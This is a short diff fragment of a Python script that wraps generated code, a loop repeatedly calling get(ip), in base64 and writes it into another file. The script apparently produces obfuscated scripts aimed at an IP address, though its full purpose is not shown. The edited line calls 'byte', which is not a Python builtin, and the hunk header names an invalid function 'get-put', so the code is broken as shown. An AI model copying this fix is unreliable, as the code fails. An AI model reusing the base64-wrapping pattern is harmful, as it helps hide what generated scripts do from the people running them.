@@ -19,7 +19,7 @@ def get-put(ip):
 	os.system("clear")
 while True:
 	get(ip)""".format(opt, opt2)
-cod1 = base64.b64encode(cod)
+cod1 = base64.b64encode(byte(str(cod)))
 op1 = op.write("""
 import os
 import base64
